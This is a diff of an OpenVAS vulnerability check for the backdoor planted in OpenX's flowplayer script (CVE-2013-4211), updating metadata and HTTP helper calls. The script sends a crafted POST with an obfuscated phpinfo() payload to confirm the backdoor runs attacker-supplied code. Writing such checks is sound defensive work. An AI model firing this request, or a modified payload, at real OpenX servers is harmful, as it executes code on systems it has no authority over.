@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_openx_backdoor_61650.nasl 3911 2016-08-30 13:08:37Z mime $
+# $Id: gb_openx_backdoor_61650.nasl 5842 2017-04-03 13:15:19Z cfi $
 #
 # OpenX 'flowplayer-3.1.1.min.js' Backdoor Vulnerability
 #
@@ -30,7 +30,6 @@ context of the application. Successful attacks will compromise the
 affected application.
 Impact Level: Application";
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103755";
 CPE = "cpe:/a:openx:openx";
 
 tag_insight = "The security issue is caused due to the distribution of a
@@ -44,12 +43,12 @@ tag_vuldetect = "It was possible to execute 'phpinfo()' by sending a special cra
 
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103755");
  script_bugtraq_id(61650);
  script_cve_id("CVE-2013-4211");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 3911 $");
+ script_version ("$Revision: 5842 $");
 
  script_name("OpenX 'flowplayer-3.1.1.min.js' Backdoor Vulnerability");
 
@@ -57,9 +56,8 @@ if (description)
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61650");
  script_xref(name:"URL", value:"http://blog.openx.org/08/important-update-for-openx-source-2-8-10-users/");
  
- script_tag(name:"last_modification", value:"$Date: 2016-08-30 15:08:37 +0200 (Tue, 30 Aug 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-04-03 15:15:19 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2013-08-09 14:28:44 +0200 (Fri, 09 Aug 2013)");
- script_summary("Determine if it is possible to execute phpinfo()");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -82,26 +80,23 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-if(!get_port_state(port))exit(0);
-
-if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
+if(!port = get_app_port(cpe:CPE))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 ex = 'vastPlayer=%3B%29%28bsavcuc'; # phpinfo(); | reverse | rot13 | urlencode
 len = strlen(ex);
 
-host = get_host_name();
+host = http_host_name(port:port);
 
 req = 'POST ' + dir + '/www/delivery/fc.php?file_to_serve=flowplayer/3.1.1/flowplayer-3.1.1.min.js&script=deliveryLog:vastServeVideoPlayer:player HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' + 
-      'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/17.0 Firefox/17.0 OpenVAS\r\n' + 
+      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
       'Content-Length: ' + len + '\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' + 
       'Connection: close\r\n' + 
       '\r\n' + 
       ex;
-      
-result = http_send_recv(port:port, data:req, bodyonly:FALSE);          
+result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if("<title>phpinfo()" >< result) {
   security_message(port:port);
@@ -109,5 +104,3 @@ if("<title>phpinfo()" >< result) {
 }
 
 exit(99);
-
-
